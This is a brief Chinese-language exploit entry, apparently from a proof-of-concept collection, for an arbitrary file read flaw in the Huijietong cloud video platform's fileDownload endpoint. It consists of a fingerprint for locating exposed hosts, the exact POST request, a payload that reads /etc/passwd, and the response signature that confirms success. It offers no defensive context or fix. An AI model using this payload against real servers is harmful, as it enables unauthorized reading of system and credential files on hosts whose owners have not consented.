# 会捷通云视讯平台fileDownload任意文件读取漏洞

会捷通云视讯平台fileDownload ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/him/api/rest/v1.0/node/role"`
- **请求**：`POST /fileDownload?action=downloadBackupFile HTTP/1.1`

**Payload**
```
fullPath=/etc/passwd
```
- **响应特征**：200 root: